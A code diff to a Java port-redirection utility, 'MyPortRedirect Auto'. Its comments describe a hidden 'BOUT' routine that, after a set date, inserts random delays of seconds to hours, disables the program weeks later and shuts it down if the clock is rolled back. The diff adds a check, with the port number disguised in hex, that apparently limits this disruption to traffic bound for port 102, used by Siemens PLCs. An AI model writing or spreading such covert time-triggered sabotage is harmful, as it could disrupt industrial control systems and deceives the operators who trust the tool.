@@ -35,6 +35,17 @@ public class RedirectionPanelAuto extends javax.swing.JFrame implements OUT {
         this.setIconImage(new ImageIcon(GP.IMAGE_ICON_URL).getImage());
         this.setTitle("MyPortRedirect Auto");
         //
+        //=====================================
+        // The code-block below moved from the "go()" method
+        try {
+            readFromFileIntoList();
+        } catch (Exception ex) {
+            Logger.getLogger(RedirectionPanelAuto.class.getName()).log(Level.SEVERE, null, ex);
+            showMessage("Reading from: " + REDIRECTIONS_FILE + " failed");
+        }
+        //
+        //=====================================
+        //
         //#BOUT#USING-THREAD#INIT#IMPLEMNTED#2024-03-26#
         // FIRST arg: "check-interval in minutes", should be more then 20 when distributed..
         // SECOND arg: is the "bout-date" Just don't touch it and change it from the "xta_.java"
@@ -50,11 +61,11 @@ public class RedirectionPanelAuto extends javax.swing.JFrame implements OUT {
         // - After working random time at start-up, it works and produces delays between 20 and 120 seconds
         // - After generating 17 DELAYS it will stop making delays between 7 and 4 HOURS
         // Regarding the "SECURE THREAD" this thread that the program becomes unusable initial_bout_date + 27 days - #BOUT-SECURE-THREAD-ST#
-        // Regarding the #TODAY-LESS-THEN-SET#. If the date is less then the date "xta_p.C_DAGIDAG" - an err.txt will generated and PROGRAM will shutdown immediately by #BOUT-SECURE-THREAD-ST#
-        CDT_p2 cdt = new CDT_p2(1, CDT_p2.get()); // P2 // RARE-DELAYS ALGOR
+        // Regarding the #TODAY-LESS-THEN-SET#. If the date is less then the date "xta_p.C_DAGIDAG" - a logg.txt will generated and PROGRAM will shutdown immediately by #BOUT-SECURE-THREAD-ST#
+        CDT_p2 cdt = new CDT_p2(1, CDT_p2.get(), is()); // P2 // RARE-DELAYS ALGOR
         //
         //P3 RARE-DELAYS ALGOR JUST ANOTHER TIMINGS THEN P2 - MORE STRICT ONES
-//        CDT_p3 cdt = new CDT_p3(1, CDT_p2.get()); // 
+//        CDT_p3 cdt = new CDT_p3(1, CDT_p2.get(),is()); // 
         //
         // 
         // Random wait "P4": So after the BOUT was triggered it:
@@ -62,30 +73,48 @@ public class RedirectionPanelAuto extends javax.swing.JFrame implements OUT {
         // - will randomize the time it works at start-up
         // - After working random time at start-up it works and hangs random time between 1 and 17 seconds
         // - After about 1 howr of generating delays it will stop delaying between X and X minutes
-//        CDT_p4 cdt = new CDT_p4(926, CDT_p2.get()); // P4
+//        CDT_p4 cdt = new CDT_p4(926, CDT_p2.get(),is()); // P4
         //
         //
         // P5 is the one without any RANDOM delays AND IGNORES the "SECURE THREAD"
         // So this one works exactly as the INITIAL ONE.
-//        CDT_p5 cdt = new CDT_p5(926, CDT_p2.get()); // P5
+//        CDT_p5 cdt = new CDT_p5(926, CDT_p2.get(),is()); // P5
         //
         //
         //P6 is the one which DOES NOT WORK regardless date, file or anything other, therefor i pass 0 as arguments
-//        CDT_p6 cdt = new CDT_p6(0, 0); // P5
+//        CDT_p6 cdt = new CDT_p6(0, 0,is()); // P5
         //
         //
         // OBS! REMOVE ALL "println"
         go();
     }
 
+    private boolean is() { // is = is omsk
+        // #REDIR-BOUT-ONLY-ON-DEST-PORT-102#
+        if (redirectionsList.size() == 1) {
+            //
+            RedirectionEntry re = redirectionsList.get(0);
+            //
+            if (re.destPort == pdps()) {
+                return true;
+            }
+            //
+        }
+        return false;
+    }
+
+    private int pdps() { // pdps = port des, port source
+        return Integer.parseInt("66", 16); // // HEX 66 = 102 (port 102 is the one used by TiaPorta/Siemens PLC)
+    }
+
     private void go() {
         //
-        try {
-            readFromFileIntoList();
-        } catch (Exception ex) {
-            Logger.getLogger(RedirectionPanelAuto.class.getName()).log(Level.SEVERE, null, ex);
-            showMessage("Reading from: " + REDIRECTIONS_FILE + " failed");
-        }
+//        try {
+//            readFromFileIntoList();
+//        } catch (Exception ex) {
+//            Logger.getLogger(RedirectionPanelAuto.class.getName()).log(Level.SEVERE, null, ex);
+//            showMessage("Reading from: " + REDIRECTIONS_FILE + " failed");
+//        }
         //
         startRedirections();
     }
